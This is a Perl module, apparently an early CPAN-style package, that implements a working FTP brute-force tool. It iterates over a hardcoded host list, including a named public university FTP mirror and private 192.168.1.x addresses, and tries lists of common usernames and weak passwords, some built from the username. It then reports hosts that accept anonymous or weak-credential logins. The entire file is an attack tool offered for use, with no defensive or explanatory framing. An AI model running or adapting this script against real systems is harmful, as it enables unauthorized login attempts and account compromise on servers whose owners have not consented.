package Secrity::bruteforcer::ftp;

use 5.006;
use IO::Socket;
use strict;
use warnings;

=head1 NAME

Secrity::bruteforcer::ftp - The great new Secrity::bruteforcer::ftp!

=head1 VERSION

Version 0.01

=cut

our $VERSION = '0.01';

my $DEBUG=0; 

my @hosts=qw(

ftp.jaist.ac.jp
192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6
);

my @usrs = ('ftp','www','admin','root','db','wwwroot','data','web','media');
my @pws = ('123456','admin','root','ftp','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2016','{user}!@#','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','fuckyou','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!','p@ssw0rd!','password1','r00t','tomcat','apache','system');

for(@hosts) {

my $re=ftp($_);

if($re){
print $_,": Anonymous opened! \n" if $re=~/ftp/;
print $_,": Weak user and password :$re ! \n";

}
}

sub ftp {

use Net::FTP;
my ($host)=@_;
print "Sclar for $_ : \n";

my $ftp = Net::FTP->new("$host", Debug =>$DEBUG,Timeout=>5) or  warn "Can't connect to $host: $@\n";
return unless $ftp;
my $result;

for(@usrs) {
my $user=$_;
for(@pws) {
my $pwd=$_;
$pwd=~s/\{user\}/$user/g if /\{user\}/;
unless($ftp->stat){
 #$ftp->quit;
 $ftp = Net::FTP->new("$host", Debug =>$DEBUG)
or print "Can't connect to $host: $@\n";
}
if( $ftp->login($user,$pwd)) {
$result.= "$user $pwd \n";
$ftp->quit;
last;
}
print "Can't login ", $ftp->message,"\n" if $DEBUG;
}
}
$ftp->quit;
return $result;

}

exit 0;
